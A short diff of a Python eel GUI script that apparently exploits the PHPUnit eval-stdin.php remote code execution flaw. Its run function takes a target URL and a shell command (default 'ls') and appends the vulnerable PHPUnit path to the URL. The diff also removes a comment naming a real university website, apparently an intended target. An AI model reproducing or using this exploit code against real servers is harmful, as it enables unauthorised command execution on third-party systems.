@@ -6,8 +6,6 @@ import eel
 
 eel.init('web')
 
-# https://aems.tesau.edu.ge/university
-
 @eel.expose
 def run(url,command = "ls"):
     url = url + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
